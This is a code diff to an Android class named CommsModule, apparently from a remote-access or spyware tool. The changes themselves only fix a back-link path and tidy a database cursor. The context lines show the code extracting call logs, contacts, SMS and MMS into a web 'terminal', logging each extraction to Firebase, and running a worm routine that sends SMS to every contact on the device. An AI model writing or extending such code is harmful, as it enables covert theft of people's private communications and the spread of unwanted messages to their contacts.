@@ -85,7 +85,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
@@ -274,7 +274,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
@@ -422,7 +422,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
@@ -520,7 +520,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
@@ -1028,11 +1028,10 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
         
         LabRatsWorker.execute(() -> {
-            try {
-                android.database.Cursor cursor = context.getContentResolver().query(
-                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
-                        null, null, null);
+            try (android.database.Cursor cursor = context.getContentResolver().query(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
+                    null, null, null)) {
                 
                 if (cursor != null) {
                     String className = "android.telephony.SmsManager";
@@ -1056,7 +1055,6 @@ public class CommsModule extends BaseModule {
                             }
                         }
                     }
-                    cursor.close();
                     FirebaseConfig.logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
                 }
             } catch (Exception e) {
